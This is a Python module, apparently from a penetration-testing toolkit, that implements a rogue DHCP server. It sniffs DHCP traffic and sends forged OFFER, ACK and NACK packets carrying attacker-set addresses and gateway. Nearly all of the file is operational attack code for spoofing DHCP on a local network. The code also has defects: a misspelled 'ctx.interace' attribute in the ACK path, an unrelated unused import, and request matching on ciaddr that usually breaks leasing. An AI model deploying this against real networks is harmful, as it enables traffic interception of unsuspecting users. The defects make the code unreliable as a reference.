import time
from dataclasses import dataclass

from impacket.system_errors import ERROR_SXS_CANT_GEN_ACTCTX
from scapy.layers.dhcp import BOOTP
from scapy.layers.l2 import Ether

from ptsrvtester.protocols.dhcp.utils.registry import (
    random_xid,
    random_mac,
    get_option,
    prepare_offer_packet,
    sendp,
    DHCP,
    prepare_nack_packet,
    prepare_ack_packet,
    DHCPTypes,
    get_interface_ip
)

from ptlibs.ptprinthelper import ptprint
import netifaces as ni
from scapy.sendrecv import AsyncSniffer, sniff

__MODULELABEL__ = "DHCP spoofer"
__MODULECODE__ = "rogue_dhcp"
__ORDER__ = 100

OFFER_TTL = 30

@dataclass
class _CaptureStats:
    captured_packets: int
    dhcp_req: int
    dhcp_disc: int


def _spoof_dhcp(ctx):
    """Run rogue DHCP server"""
    src_mac = ni.ifaddresses(ctx.interface)[ni.AF_LINK][0].get("addr")
    _offered_clients = {}
    stats = _CaptureStats(0, 0, 0)

    def _is_packet_type(packet, packet_type: DHCPTypes):
        if packet.haslayer(DHCP):
            for opt in packet[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == "message-type":
                    msg_type = opt[1]
                    return msg_type == packet_type
        return False

    def _send_nack(packet):
        xid = packet[BOOTP].xid
        dst_mac = packet[Ether].src

        sendp(
            prepare_nack_packet(
                src_mac=src_mac,
                dst_mac=dst_mac,
                server_ip=get_interface_ip(ctx.interface),
                transaction_id=xid
            ),
            iface=ctx.interface,
            verbose=False
        )


    def _send_ack(packet):
        xid = packet[BOOTP].xid
        dst_mac = packet[Ether].src

        sendp(
            prepare_ack_packet(
                src_mac,
                dst_mac,
                xid,
                ctx.client_ip,
                ctx.netmask,
                ctx.giaddr,
                ctx.server_ip,
                ctx.lease,
                ctx.renewal_time,
                ctx.rebinding_time
            ),
            iface=ctx.interace,
            verbose=False
        )


    def _send_offer(packet):
        xid = packet[BOOTP].xid
        dst_mac = packet[Ether].src
        _offered_clients[dst_mac] = (ctx.client_ip, time.time() + OFFER_TTL)

        sendp(
            prepare_offer_packet(
                src_mac=src_mac,
                dst_mac=dst_mac,
                transaction_id=xid,
                offered_ip=ctx.client_ip,
                netmask=ctx.netmask,
                gateway=ctx.giaddr,
                lease=ctx.lease,
                renew=ctx.renewal_time,
                rebind=ctx.rebinding_time,
                server_ip=get_interface_ip(ctx.interface)
            ),
            iface=ctx.interface,
            verbose=False
        )


    try:
        def handle_packet(packet):
            if packet.haslayer(DHCP):
                stats.captured_packets += 1
                if _is_packet_type(packet, DHCPTypes.DISCOVER):
                    ptprint(f"Received a DHCP DISCOVER packet from {packet[Ether].src}", "INFO", indent=8)
                    stats.dhcp_disc += 1
                    _send_offer(packet)

                elif _is_packet_type(packet, DHCPTypes.REQUEST):
                    stats.dhcp_req += 1
                    mac = packet[Ether].src
                    requested_ip = packet[BOOTP].ciaddr
                    entry = _offered_clients.get(mac)

                    if entry is None or entry[1] < time.time():
                        _send_nack(packet)
                        return

                    offered_ip, _ = entry
                    if requested_ip != offered_ip:
                        _send_nack(packet)
                        return

                    ptprint(f"Received a DHCP REQUEST from {packet[Ether].src}", "INFO", indent=8)
                    _send_ack(packet)
                    del _offered_clients[mac]


        ptprint(f"Starting rogue DHCP server on interface {ctx.interface}. Press CTRL+C to exit",
                "INFO", indent=4)
        sniff(iface=ctx.interface, filter="udp and (port 67 or 68)", prn=handle_packet)

    except Exception as e:
        ctx.out(f"Error running rogue DHCP server: {e}", "ERROR", indent=4)


def run(ctx):
    print(ctx.args)
    _spoof_dhcp(ctx)
